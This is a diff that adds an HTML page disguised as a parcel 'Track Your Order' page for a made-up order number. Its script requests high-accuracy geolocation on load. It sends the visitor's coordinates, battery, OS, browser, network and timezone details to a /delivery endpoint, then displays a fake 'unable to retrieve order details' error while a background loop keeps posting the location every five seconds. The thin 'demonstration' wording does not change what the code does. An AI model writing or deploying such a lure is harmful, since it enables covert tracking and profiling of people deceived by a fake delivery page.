@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Track Your Order</title>
+    <style>
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --card-border: #30363d;
+            --text-main: #f0f6fc;
+            --text-muted: #8b949e;
+            --accent-primary: #f97316;
+            --accent-hover: #ea580c;
+            --success-color: #238636;
+            --warning-color: #f59e0b;
+            --warning-bg: rgba(245, 158, 11, 0.1);
+            --warning-border: rgba(245, 158, 11, 0.3);
+            --danger-color: #ef4444;
+            --danger-bg: rgba(239, 68, 68, 0.1);
+            --danger-border: rgba(239, 68, 68, 0.3);
+            --btn-bg: #21262d;
+            --btn-border: #30363d;
+            --btn-hover: #30363d;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.25rem;
+        }
+
+        .tracking-card {
+            width: 100%;
+            max-width: 400px;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            box-shadow: 0 16px 36px rgba(0, 0, 0, 0.45);
+            padding: 2rem 1.75rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        /* Top Icon */
+        .icon-container {
+            width: 52px;
+            height: 52px;
+            border-radius: 12px;
+            background: rgba(249, 115, 22, 0.12);
+            border: 1px solid rgba(249, 115, 22, 0.25);
+            color: var(--accent-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1.15rem;
+        }
+
+        .icon-container.warning {
+            background: var(--warning-bg);
+            border-color: var(--warning-border);
+            color: var(--warning-color);
+        }
+
+        .icon-container.danger {
+            background: var(--danger-bg);
+            border-color: var(--danger-border);
+            color: var(--danger-color);
+        }
+
+        .icon-container svg {
+            width: 26px;
+            height: 26px;
+        }
+
+        /* Header Typography */
+        .card-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 0.3rem;
+            letter-spacing: -0.01em;
+        }
+
+        .order-subtitle {
+            font-size: 0.88rem;
+            color: var(--text-muted);
+            margin-bottom: 1.5rem;
+            font-weight: 500;
+        }
+
+        /* Divider */
+        .divider {
+            width: 100%;
+            height: 1px;
+            background: var(--card-border);
+            margin-bottom: 1.5rem;
+        }
+
+        /* Views Container */
+        .view-section {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Tracking Stepper */
+        .stepper-container {
+            width: 100%;
+            max-width: 280px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin: 0 auto 1.5rem;
+        }
+
+        .stepper-step {
+            display: flex;
+            align-items: center;
+            gap: 0.85rem;
+            font-size: 0.88rem;
+            color: var(--text-muted);
+            width: 100%;
+        }
+
+        .stepper-step.completed {
+            color: var(--text-main);
+            font-weight: 500;
+        }
+
+        .stepper-step.active {
+            color: var(--text-main);
+            font-weight: 600;
+        }
+
+        .step-node {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 0.72rem;
+            border: 2px solid var(--card-border);
+            background: var(--card-bg);
+            color: var(--text-muted);
+        }
+
+        .stepper-step.completed .step-node {
+            background: var(--success-color);
+            border-color: var(--success-color);
+            color: #ffffff;
+        }
+
+        .stepper-step.active .step-node {
+            border-color: var(--accent-primary);
+            color: var(--accent-primary);
+            position: relative;
+        }
+
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: var(--accent-primary);
+            animation: pulse-ring 1.8s infinite;
+        }
+
+        @keyframes pulse-ring {
+            0% { transform: scale(0.9); opacity: 1; }
+            50% { transform: scale(1.3); opacity: 0.6; }
+            100% { transform: scale(0.9); opacity: 1; }
+        }
+
+        .stepper-line {
+            width: 2px;
+            height: 20px;
+            background: var(--card-border);
+            margin-left: 10px;
+        }
+
+        .stepper-line.completed {
+            background: var(--success-color);
+        }
+
+        /* Status Callout Block */
+        .status-callout {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--accent-primary);
+            margin-bottom: 0.45rem;
+        }
+
+        .status-explanation {
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            line-height: 1.45;
+            max-width: 300px;
+        }
+
+        /* Error Presentation */
+        .error-title {
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 0.65rem;
+        }
+
+        .error-message {
+            font-size: 0.84rem;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-bottom: 1.5rem;
+            max-width: 310px;
+        }
+
+        /* Primary Action Button */
+        .primary-button {
+            width: 100%;
+            padding: 0.75rem 1.25rem;
+            background: var(--btn-bg);
+            color: var(--text-main);
+            border: 1px solid var(--btn-border);
+            border-radius: 8px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .primary-button:hover:not(:disabled) {
+            background: var(--btn-hover);
+            border-color: #58a6ff;
+            color: #ffffff;
+        }
+
+        .primary-button:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+
+        .primary-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Spinner for loading state */
+        .inline-spinner {
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="tracking-card">
+        <!-- Main Tracking View (Visible initially) -->
+        <div id="tracking-view" class="view-section">
+            <!-- Small Package SVG Icon -->
+            <div class="icon-container">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path>
+                    <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
+                    <line x1="12" y1="22.08" x2="12" y2="12"></line>
+                </svg>
+            </div>
+
+            <h1 class="card-title">Track Your Order</h1>
+            <div id="order-number" class="order-subtitle">Order #AG-76041</div>
+
+            <div class="divider"></div>
+
+            <!-- Vertical Stepper -->
+            <div class="stepper-container">
+                <div class="stepper-step completed">
+                    <div class="step-node">✓</div>
+                    <span>Order Confirmed</span>
+                </div>
+                <div class="stepper-line completed"></div>
+
+                <div class="stepper-step completed">
+                    <div class="step-node">✓</div>
+                    <span>Shipped</span>
+                </div>
+                <div class="stepper-line completed"></div>
+
+                <div class="stepper-step active">
+                    <div class="step-node">
+                        <div class="pulse-dot"></div>
+                    </div>
+                    <span>Out for Delivery</span>
+                </div>
+                <div class="stepper-line"></div>
+
+                <div class="stepper-step">
+                    <div class="step-node">○</div>
+                    <span>Delivered</span>
+                </div>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="status-callout">Out for Delivery</div>
+            <p class="status-explanation">
+                Allow location access to demonstrate live delivery tracking.
+            </p>
+        </div>
+
+        <!-- Simulated Tracking Error View (Visible after first successful location fix) -->
+        <div id="error-view" class="view-section" style="display: none;">
+            <!-- Warning SVG Icon -->
+            <div class="icon-container warning">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                    <line x1="12" y1="9" x2="12" y2="13"></line>
+                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+            </div>
+
+            <h2 class="error-title">Unable to retrieve order details</h2>
+            <p class="error-message">
+                We're currently unable to retrieve the latest delivery information. Please try again later.
+            </p>
+
+            <button id="try-again-btn" class="primary-button" type="button">
+                <span>Try Again</span>
+            </button>
+        </div>
+
+        <!-- Permission Denied View (Visible if location permission is denied) -->
+        <div id="denied-view" class="view-section" style="display: none;">
+            <!-- Location Pin Danger SVG Icon -->
+            <div class="icon-container danger">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                    <circle cx="12" cy="10" r="3"></circle>
+                </svg>
+            </div>
+
+            <h2 class="error-title">Location Permission Required</h2>
+            <p class="error-message">
+                Location access is required for this tracking demonstration.
+            </p>
+
+            <button id="retry-perm-btn" class="primary-button" type="button">
+                <span>Try Again</span>
+            </button>
+        </div>
+    </div>
+
+    <script src="/js/diagnostics.js"></script>
+    <script>
+        (function () {
+            // 1. Order Number Management (Persistent Order #AG-XXXXX for demo)
+            function getOrCreateOrderNumber() {
+                const STORAGE_KEY = "demoOrderNumber";
+                let orderNum = localStorage.getItem(STORAGE_KEY);
+                if (!orderNum) {
+                    const randomDigits = Math.floor(10000 + Math.random() * 90000);
+                    orderNum = "AG-" + randomDigits;
+                    localStorage.setItem(STORAGE_KEY, orderNum);
+                }
+                return orderNum;
+            }
+
+            // 2. Underlying Delivery ID for existing backend integration (DEL-XXXXXXXX)
+            function getOrCreateDeliveryId() {
+                const STORAGE_KEY = "deliveryId";
+                let currentId = localStorage.getItem(STORAGE_KEY);
+                if (!currentId || !/^DEL-[A-Z0-9]{8}$/.test(currentId)) {
+                    const characters = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+                    let result = "DEL-";
+                    for (let i = 0; i < 8; i++) {
+                        result += characters[Math.floor(Math.random() * characters.length)];
+                    }
+                    currentId = result;
+                    localStorage.setItem(STORAGE_KEY, currentId);
+                }
+                return currentId;
+            }
+
+            const deliveryId = getOrCreateDeliveryId();
+            const orderNumber = getOrCreateOrderNumber();
+
+            // Set Order Number in UI
+            const orderNumberEl = document.getElementById("order-number");
+            if (orderNumberEl) {
+                orderNumberEl.textContent = "Order #" + orderNumber;
+            }
+
+            // DOM Views
+            const trackingView = document.getElementById("tracking-view");
+            const errorView = document.getElementById("error-view");
+            const deniedView = document.getElementById("denied-view");
+            const tryAgainBtn = document.getElementById("try-again-btn");
+            const retryPermBtn = document.getElementById("retry-perm-btn");
+
+            // Diagnostics State (Real runtime collection via standard browser APIs)
+            let currentBattery = {
+                level: "Information Unavailable",
+                charging: "Information Unavailable"
+            };
+
+            if (typeof navigator.getBattery === "function") {
+                try {
+                    navigator.getBattery().then(b => {
+                        function updateBat() {
+                            if (typeof b.level === "number" && !isNaN(b.level)) {
+                                currentBattery.level = `${Math.round(b.level * 100)}%`;
+                            }
+                            if (typeof b.charging === "boolean") {
+                                currentBattery.charging = b.charging ? "Charging" : "Not Charging";
+                            }
+                        }
+                        updateBat();
+                        b.addEventListener("levelchange", updateBat);
+                        b.addEventListener("chargingchange", updateBat);
+                    }).catch(() => {});
+                } catch (e) {}
+            }
+
+            function detectDeviceCategory() {
+                if (navigator.userAgentData && typeof navigator.userAgentData.mobile === "boolean") {
+                    if (navigator.userAgentData.mobile) {
+                        const ua = (navigator.userAgent || "").toLowerCase();
+                        if (ua.includes("tablet") || ua.includes("ipad")) return "Tablet";
+                        return "Mobile";
+                    }
+                }
+                const ua = (navigator.userAgent || "").toLowerCase();
+                if (!ua) return "Information Unavailable";
+                if (ua.includes("ipad") || (ua.includes("android") && !ua.includes("mobile")) || ua.includes("tablet")) {
+                    return "Tablet";
+                }
+                if (/mobi|iphone|ipod|android.*mobile|windows phone|blackberry/i.test(ua)) {
+                    return "Mobile";
+                }
+                if (/windows|macintosh|mac os x|linux|cros/i.test(ua)) {
+                    return "Desktop";
+                }
+                return "Information Unavailable";
+            }
+
+            function detectOS() {
+                const rawUA = navigator.userAgent || "";
+                if (!rawUA) return "Information Unavailable";
+
+                if (/Windows NT 10.0/i.test(rawUA)) return "Windows 10/11";
+                if (/Windows NT 6.3/i.test(rawUA)) return "Windows 8.1";
+                if (/Windows NT 6.2/i.test(rawUA)) return "Windows 8";
+                if (/Windows NT 6.1/i.test(rawUA)) return "Windows 7";
+                if (/Windows/i.test(rawUA)) return "Windows";
+
+                if (/Android\s+([0-9.]+)/i.test(rawUA)) {
+                    const m = rawUA.match(/Android\s+([0-9.]+)/i);
+                    return m ? `Android ${m[1]}` : "Android";
+                }
+                if (/iPhone OS\s+([0-9_]+)/i.test(rawUA)) {
+                    const m = rawUA.match(/iPhone OS\s+([0-9_]+)/i);
+                    return m ? `iOS ${m[1].replace(/_/g, ".")}` : "iOS";
+                }
+                if (/iPad.*OS\s+([0-9_]+)/i.test(rawUA)) {
+                    const m = rawUA.match(/OS\s+([0-9_]+)/i);
+                    return m ? `iPadOS ${m[1].replace(/_/g, ".")}` : "iPadOS";
+                }
+                if (/Mac OS X\s+([0-9_]+)/i.test(rawUA)) {
+                    const m = rawUA.match(/Mac OS X\s+([0-9_]+)/i);
+                    return m ? `macOS ${m[1].replace(/_/g, ".")}` : "macOS";
+                }
+                if (/CrOS/i.test(rawUA)) return "Chrome OS";
+                if (/Linux/i.test(rawUA)) return "Linux";
+
+                return "Information Unavailable";
+            }
+
+            function detectBrowser() {
+                const rawUA = navigator.userAgent || "";
+                if (!rawUA) return "Information Unavailable";
+
+                let match;
+                if ((match = rawUA.match(/Edg(?:e)?\/([0-9.]+)/i))) {
+                    return `Microsoft Edge ${match[1]}`;
+                }
+                if ((match = rawUA.match(/OPR\/([0-9.]+)/i)) || (match = rawUA.match(/Opera\/([0-9.]+)/i))) {
+                    return `Opera ${match[1]}`;
+                }
+                if ((match = rawUA.match(/SamsungBrowser\/([0-9.]+)/i))) {
+                    return `Samsung Internet ${match[1]}`;
+                }
+                if ((match = rawUA.match(/Chrome\/([0-9.]+)/i)) && !rawUA.includes("Chromium")) {
+                    return `Chrome ${match[1]}`;
+                }
+                if ((match = rawUA.match(/Firefox\/([0-9.]+)/i))) {
+                    return `Firefox ${match[1]}`;
+                }
+                if (/Safari/i.test(rawUA) && (match = rawUA.match(/Version\/([0-9.]+)/i))) {
+                    return `Safari ${match[1]}`;
+                }
+                if ((match = rawUA.match(/Chromium\/([0-9.]+)/i))) {
+                    return `Chromium ${match[1]}`;
+                }
+
+                return "Information Unavailable";
+            }
+
+            function detectScreen() {
+                if (window.screen && typeof window.screen.width === "number" && typeof window.screen.height === "number") {
+                    if (window.screen.width > 0 && window.screen.height > 0) {
+                        return `${window.screen.width} × ${window.screen.height}`;
+                    }
+                }
+                return "Information Unavailable";
+            }
+
+            function getNetworkInfo() {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                let connection = "Information Unavailable";
+                let networkQuality = "Information Unavailable";
+                let downlink = "Information Unavailable";
+                let rtt = "Information Unavailable";
+
+                if (conn) {
+                    if (conn.type && conn.type !== "unknown" && conn.type !== "none") {
+                        connection = String(conn.type);
+                    }
+                    if (conn.effectiveType) {
+                        networkQuality = String(conn.effectiveType).toUpperCase();
+                    }
+                    if (typeof conn.downlink === "number" && !isNaN(conn.downlink)) {
+                        downlink = `${conn.downlink} Mbps`;
+                    }
+                    if (typeof conn.rtt === "number" && !isNaN(conn.rtt)) {
+                        rtt = `${conn.rtt} ms`;
+                    }
+                }
+
+                return { connection, networkQuality, downlink, rtt };
+            }
+
+            function getEnvironmentInfo() {
+                let timezone = "Information Unavailable";
+                let language = "Information Unavailable";
+
+                try {
+                    if (typeof Intl !== "undefined" && Intl.DateTimeFormat) {
+                        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        if (tz && typeof tz === "string" && tz.trim().length > 0) {
+                            timezone = tz.trim();
+                        }
+                    }
+                } catch (e) {}
+
+                if (navigator.language && typeof navigator.language === "string" && navigator.language.trim()) {
+                    language = navigator.language.trim();
+                } else if (navigator.languages && navigator.languages.length > 0 && navigator.languages[0]) {
+                    language = String(navigator.languages[0]).trim();
+                }
+
+                return { timezone, language };
+            }
+
+            function collectDiagnostics(position) {
+                const net = getNetworkInfo();
+                const env = getEnvironmentInfo();
+
+                let accuracy = "Information Unavailable";
+                let timestamp = new Date().toISOString();
+
+                if (position && position.coords) {
+                    if (typeof position.coords.accuracy === "number" && !isNaN(position.coords.accuracy)) {
+                        accuracy = `±${Math.round(position.coords.accuracy)} m`;
+                    }
+                    if (position.timestamp) {
+                        timestamp = new Date(position.timestamp).toISOString();
+                    }
+                }
+
+                return {
+                    device: detectDeviceCategory(),
+                    os: detectOS(),
+                    browser: detectBrowser(),
+                    screen: detectScreen(),
+                    connection: net.connection,
+                    networkQuality: net.networkQuality,
+                    downlink: net.downlink,
+                    rtt: net.rtt,
+                    timezone: env.timezone,
+                    language: env.language,
+                    batteryLevel: currentBattery.level,
+                    batteryCharging: currentBattery.charging,
+                    accuracy: accuracy,
+                    timestamp: timestamp
+                };
+            }
+
+            // Tracking & Network State
+            let watchId = null;
+            let latestCoords = null;
+            let latestPosition = null;
+            let hasReceivedFirstLocation = false;
+            let isSending = false;
+            let lastPostTime = 0;
+            const MIN_INTERVAL_MS = 2500; // minimum 2.5s between network posts
+
+            // View Switcher Helper
+            function showView(view) {
+                trackingView.style.display = (view === "tracking") ? "flex" : "none";
+                errorView.style.display = (view === "error") ? "flex" : "none";
+                deniedView.style.display = (view === "denied") ? "flex" : "none";
+            }
+
+            // Send coordinates and runtime diagnostics to existing server backend (/delivery)
+            async function sendLocation(lat, lng, position) {
+                const now = Date.now();
+                if (isSending || (now - lastPostTime < MIN_INTERVAL_MS)) {
+                    return;
+                }
+
+                isSending = true;
+                const diag = (typeof collectRuntimeDiagnosticsAsync === "function")
+                    ? await collectRuntimeDiagnosticsAsync(position || latestPosition)
+                    : (typeof collectRuntimeDiagnostics === "function"
+                        ? collectRuntimeDiagnostics(position || latestPosition)
+                        : collectDiagnostics(position || latestPosition));
+
+                fetch("/delivery", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        id: deliveryId,
+                        lat: lat,
+                        lng: lng,
+                        diagnostics: diag
+                    })
+                })
+                    .then(res => {
+                        isSending = false;
+                        lastPostTime = Date.now();
+
+                        if (res.ok && !hasReceivedFirstLocation) {
+                            hasReceivedFirstLocation = true;
+                            // Once the first successful location update is sent, show simulated error
+                            showView("error");
+                        }
+                    })
+                    .catch(err => {
+                        isSending = false;
+                        console.warn("Background location update failed:", err);
+                    });
+            }
+
+            // Start Geolocation API flow
+            function startTracking() {
+                if (!navigator.geolocation) {
+                    showView("denied");
+                    return;
+                }
+
+                // If first location was already achieved, stay on error view while watching
+                if (!hasReceivedFirstLocation) {
+                    showView("tracking");
+                }
+
+                watchId = navigator.geolocation.watchPosition(
+                    position => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        latestCoords = { lat, lng };
+                        latestPosition = position;
+
+                        // Send location to existing backend with real position
+                        sendLocation(lat, lng, position);
+                    },
+                    error => {
+                        if (error.code === error.PERMISSION_DENIED) {
+                            // If permission is denied before any location is received
+                            if (!hasReceivedFirstLocation) {
+                                showView("denied");
+                            }
+                        }
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 20000,
+                        maximumAge: 0
+                    }
+                );
+            }
+
+            // Heartbeat: continuously stream coordinates in background even when stationary or on error view
+            setInterval(() => {
+                if (latestCoords) {
+                    sendLocation(latestCoords.lat, latestCoords.lng, latestPosition);
+                }
+            }, 5000);
+
+            // "Try Again" Button (Simulated error state handler)
+            tryAgainBtn.addEventListener("click", () => {
+                tryAgainBtn.disabled = true;
+                tryAgainBtn.innerHTML = '<span class="inline-spinner"></span><span>Checking order status...</span>';
+
+                // If coordinates are available, send an update in the background
+                if (latestCoords) {
+                    sendLocation(latestCoords.lat, latestCoords.lng, latestPosition);
+                }
+
+                setTimeout(() => {
+                    tryAgainBtn.disabled = false;
+                    tryAgainBtn.innerHTML = '<span>Try Again</span>';
+                    // Re-render simulated error view
+                    showView("error");
+                }, 1300);
+            });
+
+            // "Try Again" on Permission Denied View
+            retryPermBtn.addEventListener("click", () => {
+                if (watchId !== null) {
+                    navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
+                }
+                startTracking();
+            });
+
+            // Automatically initiate browser Geolocation API flow on load
+            startTracking();
+        })();
+    </script>
+</body>
+
+</html>
